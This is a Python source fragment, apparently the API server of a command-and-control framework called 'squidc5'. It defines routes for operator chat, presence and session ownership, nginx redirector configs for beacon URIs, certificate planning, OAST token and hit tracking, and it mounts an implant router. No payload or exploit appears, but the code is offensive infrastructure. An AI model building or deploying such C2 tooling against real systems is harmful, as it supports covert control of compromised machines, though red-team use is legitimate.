        state = get_state(request)
        if not await state.features.enabled("collab_teams"):
            raise HTTPException(403, "Collab disabled")
        if not body.message.strip():
            raise HTTPException(400, "message required")
        await _require_team_member(state, auth, body.team_id)
        msg = await state.db.add_chat(auth.name, body.message.strip()[:4000], body.team_id)
        await state.metrics.emit(
            "collab.chat",
            {"actor": auth.name, "team_id": body.team_id, "len": len(body.message)},
        )
        return msg

    @api.get("/collab/chat")
    async def collab_chat_list(
        request: Request,
        limit: int = 50,
        team_id: str | None = None,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> dict[str, Any]:
        """M5: team-scoped chat when team_id set (members only); else global."""
        state = get_state(request)
        await _require_team_member(state, auth, team_id)
        rows = await state.db.list_chat(limit=min(limit, 200), team_id=team_id)
        return {"messages": list(reversed(rows)), "team_id": team_id}

    @api.post("/collab/presence")
    async def collab_presence_beat(
        body: PresenceHeartbeat,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:read", "admin")),
    ) -> dict[str, Any]:
        """M4: operator heartbeat."""
        state = get_state(request)
        if not state.presence:
            raise HTTPException(503, "presence unavailable")
        entry = state.presence.heartbeat(
            auth.name,
            status=body.status or "online",
            viewing_session=body.viewing_session,
            token_id=auth.token_id,
        )
        await state.metrics.emit("operator.presence", entry)
        return entry

    @api.get("/collab/presence")
    async def collab_presence_list(
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        online = state.presence.list_online() if state.presence else []
        return {"operators": online, "count": len(online)}

    @api.delete("/collab/presence")
    async def collab_presence_off(
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:read", "admin")),
    ) -> dict[str, bool]:
        state = get_state(request)
        ok = state.presence.offline(auth.name) if state.presence else False
        if ok:
            await state.metrics.emit("operator.presence", {"actor": auth.name, "status": "offline"})
        return {"offline": ok}

    @api.get("/collab/chat/stream")
    async def collab_chat_stream(
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> StreamingResponse:
        """SSE poll of operator chat (near real-time)."""
        state = get_state(request)
        if not await state.features.enabled("collab_teams"):
            raise HTTPException(403, "Collab disabled")

        async def gen():
            last_ts = 0.0
            while True:
                if await request.is_disconnected():
                    break
                rows = await state.db.list_chat(limit=20)
                rows = list(reversed(rows))
                for m in rows:
                    ts = float(m.get("ts") or 0)
                    if ts > last_ts:
                        yield f"data: {json.dumps(m, default=str)}\n\n"
                        last_ts = ts
                yield f"data: {json.dumps({'type': 'ping'})}\n\n"
                await asyncio.sleep(2.0)

        return StreamingResponse(gen(), media_type="text/event-stream")

    @api.post("/sessions/{session_id}/owner")
    async def set_session_owner(
        session_id: str,
        body: OwnerSet,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:write", "admin")),
    ) -> dict[str, str]:
        """Legacy owner set — prefer /claim. Admin or claim-holder only."""
        state = get_state(request)
        if not body.owner:
            raise HTTPException(400, "owner required")
        try:
            await state.teams.assert_write_access(
                session_id, auth.name, is_admin=auth.has_scope("admin")
            )
            await state.teams.set_owner(session_id, body.owner)
        except KeyError:
            raise HTTPException(404, "session not found") from None
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        return {"session_id": session_id, "owner": body.owner}

    @api.post("/deploy/redirector")
    async def deploy_redirector(
        body: RedirectorRequest,
        auth: AuthContext = Depends(require_scope("admin", "listeners:write")),
    ) -> dict[str, str]:
        from squidc5.deploy.helpers import nginx_redirector_config

        cfg = nginx_redirector_config(
            listen_port=body.listen_port,
            upstream_host=body.upstream_host,
            upstream_port=body.upstream_port,
            server_name=body.server_name,
            beacon_uris=body.beacon_uris,
        )
        return {"config": cfg, "format": "nginx"}

    @api.post("/deploy/cert-plan")
    async def deploy_cert_plan(
        body: CertPlanRequest,
        auth: AuthContext = Depends(require_scope("admin", "listeners:write")),
    ) -> dict[str, Any]:
        from squidc5.deploy.helpers import cert_rotation_plan

        return cert_rotation_plan(body.domains, body.days)

    @api.post("/deploy/wildcard-cert-plan")
    async def deploy_wildcard_cert_plan(
        body: CertPlanRequest,
        auth: AuthContext = Depends(require_scope("admin", "listeners:write")),
    ) -> dict[str, Any]:
        from squidc5.deploy.helpers import wildcard_cert_plan

        return wildcard_cert_plan(body.domains, body.days)

    # ----- OAST Collaborator -----

    async def _oast_or_403(request: Request):
        state = get_state(request)
        if not state.settings.oast_enabled or not await state.features.enabled("oast_enabled"):
            raise HTTPException(403, "OAST disabled")
        if state.oast is None:
            raise HTTPException(500, "OAST not initialized")
        return state

    @api.post("/oast/tokens")
    async def oast_create_token(
        body: OastTokenCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:write", "admin")),
    ) -> dict[str, Any]:
        state = await _oast_or_403(request)
        note = body.note or body.label or ""
        return await state.oast.create_token(note=note, created_by=auth.name, meta=body.meta)

    @api.get("/oast/tokens")
    async def oast_list_tokens(
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:read", "admin")),
        limit: int = 100,
    ) -> list[dict[str, Any]]:
        state = await _oast_or_403(request)
        return await state.oast.list_tokens(limit=limit)

    @api.get("/oast/tokens/{token_id}")
    async def oast_get_token(
        token_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:read", "admin")),
    ) -> dict[str, Any]:
        state = await _oast_or_403(request)
        c = await state.oast.get_token(token_id)
        if not c:
            raise HTTPException(404, "token not found")
        return c

    @api.get("/oast/hits")
    async def oast_list_hits(
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:read", "admin")),
        token: str | None = None,
        protocol: str | None = None,
        client_id: str | None = None,
        since: float | None = None,
        limit: int = 100,
    ) -> dict[str, Any]:
        state = await _oast_or_403(request)
        items = await state.oast.list_hits(
            client_id=client_id,
            token=token,
            protocol=protocol,
            since=since,
            limit=limit,
        )
        return {"hits": items, "count": len(items)}

    # aliases
    @api.post("/oast/clients")
    async def oast_create_client_alias(
        body: OastTokenCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:write", "admin")),
    ) -> dict[str, Any]:
        return await oast_create_token(body, request, auth)

    @api.get("/oast/clients")
    async def oast_list_clients_alias(
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:read", "admin")),
        limit: int = 100,
    ) -> list[dict[str, Any]]:
        return await oast_list_tokens(request, auth, limit)

    @api.get("/oast/interactions")
    async def oast_interactions_alias(
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:read", "admin")),
        client_id: str | None = None,
        token: str | None = None,
        protocol: str | None = None,
        since: float | None = None,
        limit: int = 100,
    ) -> dict[str, Any]:
        r = await oast_list_hits(
            request, auth, token=token, protocol=protocol, client_id=client_id, since=since, limit=limit
        )
        return {"interactions": r["hits"], "count": r["count"]}

    @api.delete("/oast/tokens/{token_id}")
    async def oast_delete_token(
        token_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("oast:write", "admin")),
    ) -> dict[str, str]:
        state = await _oast_or_403(request)
        ok = await state.oast.delete_client(token_id)
        if not ok:
            raise HTTPException(404, "token not found")
        return {"status": "deleted", "id": token_id}

    from squidc5.api.routers.implant import router as implant_router

    api.include_router(implant_router)
    return api
